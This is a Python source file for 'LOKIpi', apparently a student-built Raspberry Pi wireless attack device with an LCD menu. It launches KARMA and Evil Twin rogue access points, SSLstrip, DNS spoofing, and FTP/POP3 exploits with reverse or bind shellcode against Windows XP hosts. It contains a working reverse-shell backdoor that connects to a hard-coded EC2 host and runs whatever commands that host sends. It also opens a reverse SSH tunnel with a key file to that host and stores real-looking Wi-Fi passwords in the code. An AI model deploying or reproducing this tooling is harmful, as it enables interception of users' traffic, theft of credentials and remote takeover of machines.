#!/usr/bin/python
#########################################
################### Jonathan OBrien #####
# Waterford Institute of Technology #####
#########################################
############### LOKIpi V2.1 ###############
#########################################
#########################################
#########################################
#
# pyLCD UI menu library from https://github.com/Mezgrman/pyLCD
# Wiring GPIO interaction from https://github.com/WiringPi/WiringPi-Python
# psutil
# Netifaces
# WIFI
# Flask
# LOG_EX
# urllib2



###################### Module Imports #################
#######################################################
#######################################################
import string 
import psutil
import pylcd
import time
import os, sys
from multiprocessing import Process, Value, Array, Manager
from wifi import Cell, Scheme
from wifi.exceptions import ConnectionError
from threading import Thread
import threading
import subprocess
from subprocess import check_output
import netifaces
from flask import Flask, render_template, request, jsonify
import socket
import urllib2
import struct

## Custom exploition class import
from exploit import exploit
## Custom Web server Interface Import
import loki_web_server


Version = 2.1


#from tornado.wsgi import WSGIContainer
#from tornado.ioloop import IOLoop
#from tornado.web import FallbackHandler, RequestHandler, Application
#from webserverflask import app
    
    
### ASCII Character List Generation ########################
#######################################################
### used for LCD selection input values ###############
inputCharacters = string.printable
inputCharacters = " " + inputCharacters
b =  ('Back','Delete')
fullList = list(b)
inputCharacters = tuple(inputCharacters)
for x in inputCharacters:
    fullList.append(x)      
########################################################
########################################




############## FLAGS ###################
########################################

### will use these to test if incompatible funtions are operating
### Application state

FLAG_KARMA_BROADCAST = False
FLAG_KARMA_WE = False
FLAG_KARMA_WW = False
FLAG_SSLSTRIP = False
FLAG_wan = False
FLAG_Evil = False
FLAG_WEBSITE = False
FLAG_SHELL_CONNECT = False
choice = ""


## Shared memory Manager for MultiProcessing
## Sharing state between main LCD code and Seperate Webserver Process
manager = Manager()
dictionary = manager.dict()


########################### GPIO PIN MAPPINGS ####################
############################################################

# Dictionary mapping pins on LCD to RasberryPi GPIO
# Pin map for Register Select, Enable, 4 Data lines (LED AND RW n/a)
PINMAP = {
    'RS': 7,
    'RW': 3,
    'E': 8,
    'D4': 17,
    'D5': 18,
    'D6': 27,
    'D7': 22,
    'LED': 101,
}

# input pinmap including making 10 both ok and down, also include
# unused LEDs 101 for Library compatability

INPUT_PINMAP = {
        'UP': 4,
        'LEFT': 23,
        'RIGHT': 10,
        'DOWN': 9,
        'READY': 101,
        'ERROR': 101,
        'OK': 10,  
}


# DisplayUI class Instantiation for the HD44780 LCD, RPi.GPIO with personal mappings  
display = pylcd.hd44780.Display(backend = pylcd.hd44780.GPIOBackend, pinmap = PINMAP, lines = 4, columns = 20)
ui = pylcd.hd44780.DisplayUI(display, pylcd.hd44780.GPIOInput, input_kwargs = {'pinmap': INPUT_PINMAP})
# Sends Clear command to the LCD 0b00000001
display.clear()

ui.message( " Welcome ", align = 'center', wrap = False, duration = 1)


############################### Progress BAR ########################

##def progressbar():
##    x =0.0
##    bar = ui.progress_bar("Scanning...", fraction = x, char = "*")
##    while x < 1.0:
##        x += 1.0 / 16.
##        bar.update(fraction = x)
##        time.sleep(1.0)

#########################################
########################################
#######################################




#### Return The MAC addresses of connected stations ####################################################
#########################################################################################################
##########################################################################################################

def connected_sta():
    p = subprocess.Popen("/rasberryPwnPi/hostapd-1.0-karma/hostapd/hostapd_cli -p /var/run/hostapd all_sta", stdout=subprocess.PIPE, shell=True)
    (output, err) = p.communicate()
 
    ## Wait for date to terminate. Get return returncode ##
    p_status = p.wait()
    print "Command output : ", output
    #print "Command exit status/return code : ", p_status
    #pass
    output =  output.splitlines()[1:]
    return output



##############################################################################################
##############################################################################################
###################### RESERVSE SSH Tunnel to Amazon#########################################
#############################################################################################

#def reverse_ssh_tunnel():
#    try:
#        subprocess.call(["ssh", "-fN2R", "0.0.0.0:2210:localhost:2210", "54.72.28.175"])
#    except:
#        print "ssh tunnel failure"

def reverse_ssh_tunnel():
    try:
        subprocess.call(["route", "add", "default", "gw", "192.168.1.1",  "eth0"])
        #subprocess.call(["/rasberryPwnPi/pythonCode/reverse_ssh.sh"])
        ##ssh -i AWS_Kali_Small_Priced_Key.pem -v -fN2R 0.0.0.0:2210:localhost:22 kali@54.72.28.175
        subprocess.call(["ssh", "-i", "/rasberryPwnPi/pythonCode/AWS_Kali_Small_Priced_Key.pem", "-v", "-fN2R","0.0.0.0:2210:localhost:22", "kali@54.72.28.175"])
        print "ssh tunnel up"
        ui.message("Tunnel UP!", align = 'center', duration = 1.5)
    except:
        print "ssh tunnel failure"
        ui.message("Tunnel Failed!", align = 'center', duration = 1.5)
        
    
########################################## REVERSE SHELL through PORT 80 ###################################
############################################################################################################
############################################################################################################
########################################## BACKDOOR ########################################################


def reverse_shell():
    #################################################
    #################################################
    ## DO test here for Network Connection ##########
    #################################################
    #################################################
    ### add options for DHClient to obtain address automatically for ETH0
    
    subprocess.call(["route", "add", "default", "gw", "192.168.1.1",  "eth0"])
    try:
        
        my_ip = urllib2.urlopen('http://ip.42.pl/raw').read()
    ##implement better error handeling!!! - note to self 
    except:
        print "ExTERNAL ip issue"
        
    ## may use later if amazon public IPs are not static
    ip = socket.gethostbyname_ex("ec2-54-72-28-175.eu-west-1.compute.amazonaws.com")
    ip_addr = ip[2]
    
    global FLAG_SHELL_CONNECT 
    #AmazonEC2 = '46.51.199.51'
    ip_addr = str(ip_addr)
    ip_addr = ip_addr[2:-2]
    AmazonEC2 = ip_addr
    print AmazonEC2
   
    TargetPort = 80
    #test = "192.168.1.2"
    #
    ##print str(ip_addr)
    ##print int(ip_addr)
    #print AmazonEC2
    #print test
    
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        sock.connect((AmazonEC2, TargetPort))
        FLAG_SHELL_CONNECT = True
    except socket.error, e:
        FLAG_SHELL_CONNECT = False
        print e
    
    
    #### Send connection Header -- Banner ############
    sock.send('!<<<<<<<<<<<<<<<  Loki  >>>>>>>>>>>>>>>>>>!\n')
    sock.send('from \n' + my_ip + " \n")
    sock.send('Type Commands For Interaction!\n')
    
    while True:
         data = sock.recv(1024)
         ## exectute commands from the data recieved from the socket
         bash_interaction = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
         stdout_value = bash_interaction.stdout.read() + bash_interaction.stderr.read()
         ## Return the output 
         sock.send(stdout_value)
    sock.close()
  




############################################################################################################
############################################################################################################
############################################################################################################
############################################################################################################
############################################################################################################
############################################################################################################



def restart():
    python = sys.executable
    os.execl(python, python, * sys.argv)
    
    
################################################# ROUGE  ##################################
###########################################################################################################
############################################################################################################
def rouge():
    global dictionary
    global FLAG_KARMA_BROADCAST
    global FLAG_KARMA_WE 
    global FLAG_KARMA_WW 
    global FLAG_SSLSTRIP 
    global FLAG_wan 
    global FLAG_Evil 
    global FLAG_WEBSITE
    global ui
    global display
    tempaddr = True
    try:
       while True:
        
          res = ui.list_dialog("...Menu...", ( "Wireless Scan", "KARMA", "Extras", "Evil Twin","System info", "Quit", "Shutdown" ), align = 'center')
          
        ################################################# KARMA ############################################################
        ####################################################################################################################
        #####################################################################################################################
        #####################################################################################################################
        
          if res[1] == "KARMA":
                  
                  while True:
                        wres = ui.list_dialog("<<<KARMA>>>", ("Karma_we", "Karma_ww" ,"Terminate KARMA","whitelist", "Connected Stations", "<-Back"), align = 'center')
                        
                        
                        if wres[1] == "whitelist":
                            subprocess.call(["/rasberryPwnPi/scripts/whitelist.sh"])
                        
                        #################### Wireless To Ethenet Routing ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
                        ###################################################################################
                    
                        elif wres[1] == "Karma_we":
                            
                            if FLAG_KARMA_WE or FLAG_KARMA_WW == True:
                                ui.message("Already Enabled!!!!", align = 'center', duration = 1.5)
                                break
                            
                            print "here"
                            ui.message("Starting KARMA", align = 'center', duration = 1.5)
                            retCode = subprocess.call(["/rasberryPwnPi/scripts/karma_we.sh"])
                            ### Do check on return code to enable flag or not
                            ############
                            ## make sure that the WLAN1 interface has IP
                            try:
                                tempaddr = netifaces.ifaddresses("wlan1")   
                            except Exception, e:
                                ui.message("Access Issue", align = 'center', duration = 10)
                                tempaddr = False
                            if netifaces.AF_INET in tempaddr == False:
                                ui.message("Wlan1 IP Error", align = 'center', duration = 10)
                                subprocess.call(["/rasberryPwnPi/scripts/karma_wlan1_retry.sh"])
                                break
                            
                            
                            print "Before MUTATION OF ObJect ----- Debugggggggg"
                            #print  FLAG_KARMA_BROADCAST
                            print hex(id(dictionary[1]))                            
                            
                            FLAG_KARMA_BROADCAST = True
                            FLAG_KARMA_WE = True
                            dictionary[1] = True
                            print "Deeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeebugggggggggggggggggggggggggg"
                            #print  FLAG_KARMA_BROADCAST
                            #print hex(id(FLAG_KARMA_BROADCAST))
                            print hex(id(dictionary[1]))
                            print "Deeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeebugggggggggggggggggggggggggg" 

                        
                        
                        
                        
                        
                        #################### Wireless To Wireless Routing ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
                        ###################################################################################                        
                        
                        elif wres[1] == "Karma_ww":
                            if FLAG_KARMA_WE or FLAG_KARMA_WW == True:
                                ui.message("Already Enabled!!!!", align = 'center', duration = 1.5)
                                break
                            
                            ui.message("Starting KARMA", align = 'center', duration = 1.5)
                            retCode = subprocess.call(["/rasberryPwnPi/scripts/karma_ww.sh"])
                            
    
                            try:
                                tempaddr = netifaces.ifaddresses("wlan1")   
                            except Exception, e:
                                ui.message("Access Issue", align = 'center', duration = 10)
                                tempaddr = False
                            if netifaces.AF_INET in tempaddr == False:
                                ui.message("Wlan1 IP Error", align = 'center', duration = 10)
                                break                        
                        
                            FLAG_KARMA_WW = True
                            dictionary[1] = True
                            
                            
                            
                            
                        ###################### Disable KARMA
                        ####################################
                        ####################################
                        ####################################
  
                        elif wres[1] == "Terminate KARMA":
                           ui.message("Killing KARMA", align = 'center', duration = 1.5)
                           retCode = subprocess.call(["/rasberryPwnPi/scripts/karma_WE_CLEAN.sh"])
                           print retCode
                           FLAG_KARMA_WE = False
                           FLAG_KARMA_WW = False
                           dictionary[1] = False
                     
                     
                     
                     
                     
                     
                           
                    ##################################################################################################################
                    ##################################################################################################################
                    ###############
                    ############### Connected stations Initating EXploit code
                    ###############               EXPLOIT SYSTEM
                    ###############                    Menu
                    ##############
                    #################~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
                                                  
                        elif wres[1] == "Connected Stations":
                            output = connected_sta()
                            print "debug !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!"
                            print output
                            print "debug !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!"
                            output.append('<-Back')
                            choice_ip = ""
                            ### Find all connected clients by their MAC
                            ### lcoate their IP from the MAC address -- RARP not supported in Kernel
                            ### So done by pinging DHCP pool -
                            ### then searching output of ARP for MAC
                            ### then USE this to get the IP
                            while True:
                                
                                ##output.append('<-Back')
                                connres = ui.list_dialog("<<<Clients>>>", list(output), align = 'center')
                                if connres[1] != "<-Back":
                                    choice = connres[1]
                                    print "debug choice!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!"
                                    print choice
                                    print type(choice)
                                    print "debug choice !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!"
                                    choice = str(choice)
                                    choice = "\"" + choice + "\""                                    
                                    
                                    ### Command to Extract the IP address of the choosen MAC address from ARP system command
                                    ## output
                                    
                                    cmd1 = "arp -n | grep " + choice
                                    
                                    print "debug cmd !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!"
                                    print cmd1
                                    print "debug cmd !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!"
                                    ### Since the modern Linux Kernel does not support RARP
                                    ### have to do it manually
                                    
                                    ## Ping Sweep the DHCP POOL subnetwork to fill the ARP cache from any responces
                                    ui.message("Pinging Subnet!", align = 'center', duration = 0.5)
                                    fping = subprocess.Popen("fping -s -g 10.0.0.2 10.0.0.200 -r 1", stdout=subprocess.PIPE, shell=True)    
                                    fping.wait()
                                    time.sleep(2)
                                    
                                    ## Execute command to Return an IP if there
                                    rarp = subprocess.Popen(cmd1 , stdout=subprocess.PIPE, shell=True)
                                    (arpcache, error) = rarp.communicate()
                                    rarp_status = rarp.wait()
                                    
                                    
                                    
                                    print error
                                    print "debug -------------------------------------------------------"
                                    print arpcache
                                    
                                    
                                    ## Split ARP output to a List by spaces so that the IP which is first can be extracted 
                                    arpcache = arpcache.split()
                                    print "debug -------------------------------------------------------"
                                    print arpcache
                                    print "debug --------------------------------------------------------"
                                    
                                    
                                    
                                    try:
                                        choice_ip = arpcache[0]
                                    except  IndexError:
                                        ui.message("access error", align = 'center', duration = 5.0)
                                        break
                                    
                                    
                                    targetPort = 0
                                    targetOS = ""
                                    shellcode_type = ""
                                   
                                    
                                    while True:
                                        port_res = ui.list_dialog("<<<Target Service>>>", ( "21 - FTP", "110 - POP3", "<-Back"), align = 'center')
                                        if port_res[1] == "<-Back":
                                            break       
                                        elif port_res[1] == "21 - FTP":
                                            targetPort = 21
                                            break
                                        elif port_res[1] == "110 - POP3":
                                            targetPort = 110
                                            break
                                        break
                                    
                                    exp = exploit(choice_ip,targetPort)
                                    banner_Grab_result = exp.retBanner()
                                        

                                        
                                        
                                    while True:
                                        operating_sys_res = ui.list_dialog("<<<Target OS>>>", ( "WIN XP SP2", "WIN XP SP3", "<-Back"), align = 'center')
                                        if operating_sys_res[1] == "<-Back":
                                            break
                                        
                                        elif operating_sys_res[1] == "WIN XP SP2":
                                            targetOS = "WIN_XP_SP2"
                                        elif operating_sys_res[1] == "WIN XP SP3":
                                            targetOS = "WIN_XP_SP3"
                                        break

                                    while True:
                                       shellcode_res = ui.list_dialog("<<<SHELLCODE>>>", ( "Reverse", "Bind", "Port80", "<-Back"), align = 'center')
                                       if shellcode_res[1] == "<-Back":
                                           break
                                       elif shellcode_res[1] == "Reverse":
                                            shellcode_type = "reverse"
                                            
                                       elif shellcode_res[1] == "Bind":
                                            shellcode_type = "bind"
                                            
                                       elif shellcode_res[1] == "Port80":
                                            shellcode_type = "port80"
                                                
                                       break         
                                                
                                    def execute_exploit(OS, PAYLOAD):
                                        vuln_service = exp.checkV()
                                            #def execute(self,OS,PAYLOAD):
                                            
                                        if vuln_service == 1:
                                            exp.freefloat_ftp(OS, PAYLOAD)
                                            
                                        elif vuln_service== 2:
                                           pass
                                        
                                        elif vuln_service == 3:
                                           exp.ability_ftp(OS, PAYLOAD)
                                           
                                        elif vuln_service == 4:
                                            exp.slmail(OS, PAYLOAD)
                                        
                                        else:
                                            print "do something"            
                                    try:
                                        execute_exploit(targetOS,shellcode_type)
                                    except:
                                        print "Exploit Error"
                                    
                                    
                                                   
                                    ui.message(choice_ip, align = 'center', duration = 5.0)
                                    break
                                
                                    
                                
                                
                                
                                
                                else:
                                    break

                                    
                        elif wres[1] == "<-Back":
                           break
    
        #########################################################  EXTRA ATTACK Features #######################################################################
        ########################################################################################################################################################
        #######################################################################################################################################################
          if res[1] == "Extras":
                
                
                
                ##################################################### SSLStrip Transparent Proxy ##############################################################
                ###############################################################################################################################################
                ##############################################################################################################################################
                
                  while True:
                        exres = ui.list_dialog("<<<Extras>>>", ("SSLstrip", "DNSspoof",  "<-Back"), align = 'center')
                        
                        
                        if exres[1] == "SSLstrip":
                                while True:
                                      sslres = ui.list_dialog("<<<SSLStrip>>>", ("SSLstrip", "Terminate SSLstrip", "Parse SSL LOG", "Delete HTTP Logs", "<-Back"), align = 'center')
    
                                      if sslres[1] == "SSLstrip":
                                          if FLAG_SSLSTRIP == True:
                                              ui.message("SSLstrip\nEnabled Already", align = 'center', duration = 2.0)
                                              break
                                          
                                          elif FLAG_KARMA_WE == False and FLAG_KARMA_WW == False and FLAG_Evil == False:
                                              ui.message("Enable KARMA !!!!!", align = 'center', duration = 2.0)
                                              break
                  
                                          ui.message("Starting SSLstrip", align = 'center', duration = 1.5)
                                          retCode = subprocess.call(["/rasberryPwnPi/scripts/sslstrip_enable.sh"])
                                          FLAG_SSLSTRIP = True
                                          dictionary[2] = True
                                         
                                      elif sslres[1] == "Terminate SSLstrip":
                                         if FLAG_SSLSTRIP == False:
                                            break
                                         ui.message("Killing SSLstrip", align = 'center', duration = 1.5)
                                         retCode = subprocess.call(["/rasberryPwnPi/scripts/sslstrip_disable.sh"])
                                         FLAG_SSLSTRIP = False
                                         dictionary[2] = False
                                        
                                      elif sslres[1] == "Parse SSL LOG":
                                          ui.message("Parsing !!", align = 'center', duration = 1.5)
                                          #subprocess.call("python /root/scripts/log_ex.py /root/logPi/sslstrip.log  -o /var/www/ssllog/index.html")
                                          os.system("sudo python /rasberryPwnPi/scripts/log_ex.py %s %s %s %s" % (" /rasberryPwnPi/logPi/sslstrip.log "," -t ", " -o "," /var/www/ssllog/ssllog"))
                                          ui.message("Access at LOCALHOST:666", align = 'center', duration = 1.5)
                                          print
                                     
                                      elif  sslres[1] == "Delete HTTP Logs":
                                         print "attempting deletion" 
                                         retCode = subprocess.call(["/rasberryPwnPi/scripts/sslstrip_del_html.sh"])                
                                         print retCode
                                         print "Return Code"
                                        
                                      elif sslres[1] == "<-Back":
                                         break
    
                        elif exres[1] == "DNSspoof":
                                while True:
                                      dnsres = ui.list_dialog("<<<DNSspoofing>>>", ("Enable", "Disable", "Universal", "<-Back"), align = 'center')
    
                                      if dnsres[1] == "Enable":
                                        ui.message("Enabling DNSspoof", align = 'center', duration = 1.5)
                                        subprocess.call(["cp" , "/etc/dnsmasq.hosts.empty", "/etc/dnsmasq.hosts"])
                                        subprocess.call(["cp" , "/etc/dnsmasq.hosts.specific", "/etc/dnsmasq.hosts"])
                                        if FLAG_Evil and FLAG_KARMA_WE and FLAG_KARMA_WW == False:
                                            break                                    
                                        subprocess.call(["service" , "dnsmasq", "restart"])
                                        
                                      elif dnsres[1] == "Disable":
                                        ui.message("Disabling DNSspoof", align = 'center', duration = 1.5)
                                        ####echo wouldnt work
                                        #subprocess.call(["echo" , "   ", " > ", "/etc/dnsmasq.hosts"])
                                        subprocess.call(["cp" , "/etc/dnsmasq.hosts.empty", "/etc/dnsmasq.hosts"])
                                        if FLAG_Evil and FLAG_KARMA_WE and FLAG_KARMA_WW == False:
                                            break  
                                        subprocess.call(["service" , "dnsmasq", "restart"])
    
                                      elif dnsres[1] == "Universal":
                                        ui.message("Feature not/nImplemented", align = 'center', duration = 1.5)
    
                                      elif dnsres[1] == "<-Back":
                                         break
                         
                        elif exres[1] == "Connected Stations":
                            output = connected_sta()
                            print output
                                       
                        elif exres[1] == "<-Back":
                            break
          
          ############################################ Evil Twin attampts ##############################################################
          ##########################################!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!######################################
          ########################################## !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!! ########################################
          
          elif res[1] == "Evil Twin":
                while True:
                    etres = ui.list_dialog("<<<EvilTwin>>>", ("Evil Twin1","Evil Twin2", "Tear-Down", "<-Back"), align = 'center')
                    
                    if etres[1] == "Evil Twin1":
                        ui.message("Scanning <->", align = 'center', duration = 0.5)
                        try:
                            cells = Cell.all('wlan0')
                        except Exception, e:
                            print e.message
                            ui.message("Interface Init Err", align = 'center', duration = 1.5)
                            break    
                         
                           
                        ssids = []
                    
                        for x in range (0,len(cells)):
                            ssids.append(cells[x].ssid)
                    
                        cres = ui.list_dialog("Results", list(ssids), align = 'center')
    
                        if cres[1]:
                            choice = cres[1]
                            try:
                                index = [ x.ssid for x in cells ].index(choice)
                            except ValueError:
                                index = -1
                    
                        evilMac =  cells[index].address
                        evilSSID = str(cells[index].ssid)
                        evilChan = cells[index].channel
                    
                        print evilMac
                        print evilChan
                        print evilSSID
                        #retCode = subprocess.call(["/root/scripts/evilTwin_Start.sh",evilSSID,evilMac,evilChan ])
                        retCode = os.system("sh /rasberryPwnPi/scripts/evilTwin_Start.sh %s %s %s" % (evilSSID,evilMac,evilChan))
                        #print retCode
                        FLAG_Evil = True
                    
                    
                    elif etres[1] == "Evil Twin2":
                          while True:
                              ui.message("Scanning <->", align = 'center', duration = 0.5)
                              try:
                                  cells = Cell.all('wlan0')
                              except Exception, e:
                                  ui.message("Interface Init Err", align = 'center', duration = 1.5)
                                  print e.message
                                  break 
                                     
                              ssids = []
                              
                              for x in range (0,len(cells)):
                                  ssids.append(cells[x].ssid)
                              
                              cres = ui.list_dialog("Results", list(ssids), align = 'center')
              
                              if cres[1]:
                                  choice = cres[1]
                                  try:
                                      index = [ x.ssid for x in cells ].index(choice)
                                  except ValueError:
                                      index = -1
                              
                              evilMac =  cells[index].address
                              evilSSID = str(cells[index].ssid)
                              evilChan = cells[index].channel
                              
                              print evilMac
                              print evilChan
                              print evilSSID
                              #retCode = subprocess.call(["/root/scripts/evilTwin_Start.sh",evilSSID,evilMac,evilChan ])
                              ui.message("Cloning Initilised", align = 'center', duration = 0.5)
                              retCode = os.system("sh /rasberryPwnPi/scripts/evilTwin_Start2.sh %s %s %s" % (evilSSID,evilMac,evilChan))
                              FLAG_Evil = True
                              print retCode                
                              break
                    
                    elif etres[1] == "Tear-Down":
                        ui.message("Tear-Down Started", align = 'center', duration = 0.5)
                        subprocess.call(["/rasberryPwnPi/scripts/evilTwin_TearDown.sh"])
                        FLAG_Evil = False
                        break
                    
                    elif etres[1] == "<-Back":
                           break
                        
                        
          ################################################## WAN CONNECTION ###############################################
          ##################################################   Wireless     ###############################################
          ###################################################################################################################
          ##################################################################################################################
          
          elif res[1] == "Wireless Scan":
                  while True:
                        
                        ####could make sub sub levels for inputing UPPER/lower/symbols/Number seperatley
                        wsres = ui.list_dialog("Wirless Menu", ("Scan","Check_IP", "Back" ), align = 'center')
                        #password.join(ires[1])
                        
                        
                        
                        ######################################## Active Interface IP Check #################################
                        ###################################################################################################
                        
                        if wsres[1] ==  "Check_IP":
                            
                            ifaces = netifaces.interfaces()
                            ifaces.append('Back')
                            while True:
                                    ifres = ui.list_dialog("Interfaces", (ifaces), align = 'center')
                                    if ifres[1] != "Back":
                                        choice = ifres[1]
                                        try:
                                            addr = netifaces.ifaddresses(choice)[2][0]['addr']
                                            ui.message(addr, align = 'center', duration = 3.5)
                                        except Exception, e:
                                            ui.message("No IP", align = 'center', duration = 3.5)
                                            print "Iface Has no address"
                                    if ifres[1] == "Back":        
                                        break
                                    
                                
                        ################################################ AP SCANNING ##########################################
                        #######################################################################################################
                        ## option for initiating scanning of AP's
                        
                        if wsres[1]  == "Scan":
                            ui.message("Scanning <->", align = 'center', duration = 0.5)
                            try:
                                cells = Cell.all('wlan0')
                            except Exception, e:
                                print e.message
                                ui.message("Iface Error", align = 'center', duration = 0.5)
                                break 
                                   
                            ssids = []
                            
                            ## Get list of SSIDS in range
                            for x in range (0,len(cells)):
                                ssids.append(cells[x].ssid)
                            
                            ## create a selection menu
                            cres = ui.list_dialog("Results", list(ssids), align = 'center')
                            
                            ## Get a List index number of the choice for use
                            if cres[1]:
                                choice = cres[1]
                                try:
                                     
                                    index = [ x.ssid for x in cells ].index(choice)
                                except ValueError:
                                    index = -1
                                    
            


            
                                ### If the selection has been connected to previously
                                if Scheme.find('wlan0', choice):
                                    print "Found"
                                    ui.message("Found Previous Entry\nAttemting", align = 'Left', duration = 1.5) 
                                    #### !!!!!!!!!!!!!!!!!!!!!! add code for a re-entry of Key
                                    ## Retreieve Scheme for processing
                                    scheme = Scheme.find('wlan0', choice)
                                    try:
                                        result = scheme.activate()
                                        print "here is the result test ---degug"
                                        print result
                                        FLAG_wan = True
                                        ui.message("Connected <->", align = 'center', duration = 3.5)
                                        
                                        ################### RESET TO Default GOOGLE NAMESERVER ##############
                                        ################### !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!1~~~~~~~####
                                        ################!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!###
                                        ################ kEY EYE ON, May cause issues #########################
                                        
                                        subprocess.call(["/rasberryPwnPi/scripts/nameserver_default.sh"])
                                    except Exception as e:
                                        print "Exception Activating Found Scheme"
                                        ui.message("Failed, >>>>>> Deleted", align = 'center', duration = 2.5)
                                        FLAG_wan = False
                                        scheme.delete() 
                                    break
                            
                            ##########################################################################################################
                               #!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!~~~~~~~~~~~~~~###########################
                               #######################################################################################################
                               ################################# HARD CODED KEYS Here#################################################
                               
                                if cells[index].ssid == "TNCAP071FA6":
                                    scheme = Scheme.for_cell('wlan0', choice, cells[index], "5788C9870Bpissy8189?reality")
                                    scheme.save()
                                    try:
                                        ui.message("Hard Coded!!", align = 'Left', duration = 1.5)
                                        scheme.activate()
                                        break
                                    except Exception, e:
                                        print "Already Connected, Or Error"
                                        scheme.delete()

                                elif cells[index].ssid == "VR":
                                    scheme = Scheme.for_cell('wlan0', choice, cells[index], "12345678")
                                    scheme.save()
                                    try:
                                        ui.message("Hard Coded!!", align = 'Left', duration = 1.5)
                                        scheme.activate()
                                        break
                                    except Exception, e:
                                        print "Already Connected, Or Error"
                                        scheme.delete()
                                        
                                elif cells[index].ssid == "eircom91822337":
                                    scheme = Scheme.for_cell('wlan0', choice, cells[index], "d398091c7290")
                                    scheme.save()
                                    try:
                                        ui.message("Hard Coded!!", align = 'Left', duration = 1.5)
                                        scheme.activate()
                                        break
                                    except Exception, e:
                                        print "Already Connected, Or Error"
                                        scheme.delete()                                      
                                
                                ### If choice is encrypted#######################################################################
                                #################################################################################################
                                
                                elif cells[index].encrypted:
                                    ui.message("AP Encypted - Enter Key", align = 'center', duration = 1.5)
                                    password = ""  
                                    while True:
                                    ####could make sub sub levels for inputing UPPER/lower/symbols/Number seperatley
                                        wres = ui.list_dialog(password, list(fullList), align = 'center')
                            
                                # Enters and stores characters generated from list
                                # allows deletion 
                                        if wres[1]  != "Delete" and wres[1] != "Back":
                                          password = password + str(wres[1])

                                        if wres[1] == "Delete":
                                           password = password[:-1]
                       
                                        if wres[1] == "Back":
                                          print password
                                          break
                                        
                                    ui.message("Attempting \n Please wait", align = 'Left', duration = 0.5)
                                    scheme = Scheme.for_cell('wlan0', choice, cells[index], password)
                                    scheme.save()
                                    try:
                                        result = scheme.activate()
                                        print "here is the result test ---degug"
                                        print result
                                        FLAG_wan = True
                                        ui.message("Connected <->", align = 'center', duration = 3.5)                                        
                                        #scheme.activate()
                                    except Exception, e:
                                        print "Exception Activating Scheme"
                                        ui.message("Failed, >>>>>> Deleted", align = 'center', duration = 2.5)
                                        FLAG_wan = False                                        
                                        print e.message
                                        scheme.delete()
      
            
                                elif not cells[index].encrypted:
                                    ui.message("Attempting Ceonnection \n Please wait", align = 'Left', duration = 1.5)
                                    scheme = Scheme.for_cell('wlan0', choice, cells[index])
                                    scheme.save()
                                    try:
                                        scheme.activate()
                                        FLAG_wan = True
                                        ui.message("Connected <->", align = 'center', duration = 3.5)                                         
                                    except Exception, e:
                                        print "Exception Activating Scheme"
                                        ui.message("Failed, >>>>>> Deleted", align = 'center', duration = 3.5)
                                        FLAG_wan = False
                                        scheme.delete()
    
                                print "end of connection"
                                break
                        
    
                        elif wsres[1] == "Back":
                           break          
             
    
    
    
    ########################################################### SYSTEM INFORMATION #######################################################
    ######################################################################################################################################
    
          elif res[1] == "System info":
                  while True:
                          ires = ui.list_dialog("System info", ( "Memory","Clock", "Check_IP", "Back"), align = 'center')
                                        
                                        
                          if ires[1] == "Memory":
                                  try:
                                          key = None
                                          while True and key == None:
                                                  mem = psutil.phymem_usage()
                                                  free = mem[2] / 1024.0 / 1024.0
                                                  total = mem[0] / 1024.0 / 1024.0
                                                  
                                                  ## display and convert KB to MB
                                                  data = "Total\t%.2fMB\nFree\t%.2fMB" % (total, free)
                                                 
    
                                                  ui.message(data, duration = 0.001)
                                                  #key = ui.input.read_key()
                                                  if ui.input.return_back()== True:
                                                     break
                                                    
                                  except KeyboardInterrupt:
                                          pass
                                        
                        ########### CHECK CLOCK BECAUSE THERE IS NO RTC --- may add use of NTP here #########################
             
                          elif ires[1] == "Clock":
                                 try:
                                      while True:
                
                                            data = time.strftime("%a, %d.%m.%Y\n%H:%M:%S")
                                            ui.message(data, align = 'center')               
                                            time.sleep(1)
                                            if ui.input.return_back()== True:
                                                break
                                 except KeyboardInterrupt:
                                     pass                          
                          
    
                          elif ires[1] ==  "Check_IP":
                            
                                ifaces = netifaces.interfaces()
                                ifaces.append('Back')
                                while True:
                                        ifres = ui.list_dialog("Interfaces", (ifaces), align = 'center')
                                        if ifres[1] != "Back":
                                            choice = ifres[1]
                                            try:
                                                addr = netifaces.ifaddresses(choice)[2][0]['addr']
                                                ui.message(addr, align = 'center', duration = 3.5)
                                            except Exception, e:
                                                ui.message("No IP", align = 'center', duration = 3.5)
                                                print "Iface Has no address"
                                        if ifres[1] == "Back":        
                                            break
    
             
                          elif ires[1] == "Back":
                                  break
        
    ################################################## QUIT --- NEEDs to be changed to SYS Shutdown ############################
    ############################################################################################################################
          elif res[1] == "Quit":
            ui.message("Exiting!!!!", align = 'center')
            time.sleep(2)
            ui.clear()
            main()
        
          elif res[1] == "Shutdown":
            ui.message("Shutting Down!", align = 'center')
            time.sleep(1.5)
            ui.clear()
